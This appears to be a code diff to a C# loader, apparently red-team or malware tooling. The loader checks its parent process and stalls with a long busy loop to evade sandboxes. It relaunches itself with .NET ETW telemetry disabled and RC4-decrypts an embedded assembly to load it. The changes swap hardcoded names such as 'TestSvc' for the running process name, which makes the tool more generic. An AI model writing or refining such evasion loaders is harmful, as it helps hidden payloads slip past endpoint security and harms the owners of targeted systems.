@@ -8,7 +8,7 @@ using System.Management;
 using System.Linq;
 using System.IO;
 
-namespace TestSvc;
+namespace PositiveIntent;
 
 public class Program
 {
@@ -21,7 +21,7 @@ public class Program
             mo.Get();
             parentPid = Convert.ToInt32(mo["ParentProcessId"]);
         }
-        if (Process.GetProcessById(parentPid).ProcessName == "TestSvc")
+        if (Process.GetProcessById(parentPid).ProcessName == Process.GetCurrentProcess().ProcessName)
         {
             return true;
         }
@@ -40,7 +40,7 @@ public class Program
     static void DelayExecution()
     {
         long current_iteration = 0;
-        long target_iterations = 100000000000;
+        long target_iterations = 1000000000;
         while (current_iteration != target_iterations)
         {
             current_iteration++;
@@ -50,7 +50,7 @@ public class Program
     static void Fork(string args)
     {
         Process p = new Process();
-        p.StartInfo.FileName = "TestSvc.exe";
+        p.StartInfo.FileName = Process.GetCurrentProcess().ProcessName;
         p.StartInfo.Arguments = args;
         p.StartInfo.UseShellExecute = false;
         p.StartInfo.EnvironmentVariables["COMPlus_ETWEnabled"] = "0";
@@ -65,7 +65,7 @@ public class Program
 
     static void LoadAssembly(string[] args)
     {
-        byte[] eassembly = Properties.Resources.file1;
+        byte[] eassembly = Properties.Resources.File1;
         byte[] key = System.Text.Encoding.UTF8.GetBytes("DepthSecurity");
 
         RC4 rc4 = new RC4(key);
